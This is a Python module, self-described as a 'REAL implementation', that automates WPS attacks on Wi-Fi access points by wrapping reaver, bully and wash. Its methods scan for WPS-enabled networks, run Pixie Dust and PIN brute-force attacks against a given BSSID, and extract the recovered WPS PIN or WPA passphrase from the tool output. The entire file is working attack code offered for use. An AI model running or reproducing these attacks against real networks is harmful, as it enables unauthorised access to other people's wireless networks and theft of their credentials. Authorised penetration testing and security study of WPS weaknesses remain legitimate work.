"""WPS attack tools - REAL implementation"""
import asyncio
import re
import os
from typing import Optional


class WPSAttacker:
    """Real WPS attack implementation using reaver and bully"""

    def __init__(self):
        self._verify_installation()
        self._processes = {}

    def _verify_installation(self) -> None:
        """Verify WPS tools are installed"""
        # Check for reaver or bully
        has_reaver = self._check_command("reaver")
        has_bully = self._check_command("bully")
        
        if not has_reaver and not has_bully:
            print("WARNING: Neither reaver nor bully installed. WPS attacks won't work.")
            print("Install with: apt-get install reaver bully")

    def _check_command(self, cmd: str) -> bool:
        """Check if command exists"""
        try:
            import subprocess
            subprocess.run(
                ["which", cmd],
                capture_output=True,
                check=True,
                timeout=5
            )
            return True
        except:
            return False

    async def pixie_dust_attack(
        self,
        interface: str,
        bssid: str,
        channel: int,
    ) -> Optional[str]:
        """Execute WPS Pixie Dust attack using reaver"""
        if not self._check_command("reaver"):
            raise RuntimeError("Reaver not installed")
        
        cmd = [
            "reaver",
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-K", "1",  # Pixie dust mode
            "-vv",
        ]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # Wait for result (timeout 60 seconds for pixie dust)
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=60
            )
            
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
            # Parse PIN from output
            pin_match = re.search(r'WPS PIN: [\'"]?(\d{8})[\'"]?', output)
            if pin_match:
                return pin_match.group(1)
            
            # Check for PSK (password)
            psk_match = re.search(r'WPA PSK: [\'"]?(.+?)[\'"]?[\n\r]', output)
            if psk_match:
                return psk_match.group(1).strip()
            
            return None
        
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            raise RuntimeError(f"Pixie dust attack failed: {e}")

    async def pin_attack(
        self,
        interface: str,
        bssid: str,
        channel: int,
        pin: Optional[str] = None,
    ) -> Optional[str]:
        """Execute WPS PIN attack using bully"""
        if not self._check_command("bully"):
            raise RuntimeError("Bully not installed")
        
        cmd = [
            "bully",
            interface,
            "-b", bssid,
            "-c", str(channel),
            "-v", "3",
        ]
        
        if pin:
            cmd.extend(["-p", pin])
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # WPS PIN attacks can take a long time
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=300  # 5 minutes
            )
            
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
            # Parse PIN
            pin_match = re.search(r'PIN:\s*(\d{8})', output)
            if pin_match:
                return pin_match.group(1)
            
            # Parse password
            psk_match = re.search(r'WPA\s+PSK:\s*[\'"]?(.+?)[\'"]?[\n\r]', output)
            if psk_match:
                return psk_match.group(1).strip()
            
            return None
        
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            raise RuntimeError(f"PIN attack failed: {e}")

    async def wash_scan(self, interface: str) -> list:
        """Scan for WPS-enabled networks using wash"""
        if not self._check_command("wash"):
            # wash comes with reaver
            return []
        
        cmd = ["wash", "-i", interface, "-C"]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # Scan for 30 seconds
            await asyncio.sleep(30)
            
            process.terminate()
            stdout, stderr = await process.communicate()
            
            output = stdout.decode('utf-8', errors='ignore')
            
            # Parse wash output for WPS-enabled APs
            networks = []
            for line in output.split('\n'):
                # Wash output format: BSSID Channel RSSI WPS Version Locked ESSID
                if ':' in line and len(line.split()) >= 6:
                    parts = line.split()
                    networks.append({
                        'bssid': parts[0],
                        'channel': int(parts[1]) if parts[1].isdigit() else 0,
                        'rssi': int(parts[2]) if parts[2].lstrip('-').isdigit() else -100,
                        'wps_version': parts[3],
                        'wps_locked': 'Yes' in parts[4],
                        'essid': ' '.join(parts[5:]),
                    })
            
            return networks
        
        except Exception as e:
            print(f"Wash scan failed: {e}")
            return []

    async def _run_command(self, cmd: list, timeout: int = 30) -> str:
        """Run command and return output"""
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            
            return stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
        
        except asyncio.TimeoutError:
            raise RuntimeError(f"Command timed out: {' '.join(cmd)}")
        except Exception as e:
            raise RuntimeError(f"Command failed: {' '.join(cmd)}: {e}")
